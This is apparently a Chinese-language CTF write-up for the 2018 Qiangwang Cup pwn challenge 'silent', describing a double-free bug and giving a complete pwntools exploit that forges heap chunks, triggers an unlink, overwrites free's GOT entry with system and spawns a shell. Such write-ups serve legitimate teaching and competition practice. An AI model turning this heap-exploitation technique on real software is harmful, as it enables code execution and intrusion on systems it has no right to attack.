---
title: 强网杯2018-Pwn-silent
date: 2018-04-19
tag: CTF
layout: post
---

开启了Canary，NX，ASLR。

漏洞点：free后未置空的悬指针。

经典的Double-Free漏洞。有10个可以使用的全局指针列表。因为提供了`system`函数，并且没有开启PIE，无需绕过ASRL。

全局指针列表布局：

```
0: N1
1: N2
2: N3
3: do
4: ptr
5: big

6~9: NULL
```

EXP：

``` pyrhon
#!/usr/bin/env python2

from pwn import *

#context.log_level = 'debug'
context.terminal = ['konsole', '-e']

p = process("./silent")

free_got   = 0x602018
system_plt = 0x400730
table_addr = 0x6020C0

def add_table(size, data):
    p.sendline("1")
    p.sendline(str(size))
    p.sendline(data)

def change_table(index, data, other):
    p.sendline("3")
    p.sendline(str(index))
    p.sendline(data)
    p.sendline(other)

def free_table(index):
    p.sendline("2")
    p.sendline(str(index))

# --------------------------------

# N1 ~ N3
binsh = '/bin/sh\x00'
add_table(0x90, '1'*0x8E);
add_table(0x90, '2'*0x8E);
add_table(0x90, '3'*0x8E);

# do
add_table(0x90, '4'*0x8E)

# Ptr & F1 & F2
add_table(0x1D0, '5'*0x1CE)

free_table(0)
free_table(1)
free_table(2)
free_table(3)
free_table(4)

# big
binsh = '/bin/sh\x00'
fd = p64(table_addr + 8*3 - 24)
bk = p64(table_addr + 8*3 - 16)
# N1 ~ N3
payload  = 'A' * 0x90
payload += p64(0) + p64(0xA1) + binsh + 'A' * (0x90-len(binsh))
payload += p64(0) + p64(0xB1) + 'A' * 0x90
# do | ptr
payload += p64(0) + p64(0) + p64(0) + p64(0x91) + fd + bk + '\x00' * 0x70
payload += p64(0x90) + p64(0xA0) + 'A' * 0x90
# F1 | F2
payload += p64(0) + p64(0xA1) + 'A' * 0x90
payload += p64(0) + p64(0xA1) + 'A' * 0x8E

add_table(0x450, payload)

# unlink
free_table(4)

# write
one = p64(free_got)
change_table(3, one, '\n'*0x2E)

two = p64(system_plt)
change_table(0, two, '\n'*0x2E)

# get shell
# binsh in table 1
free_table(1)

p.interactive()
```
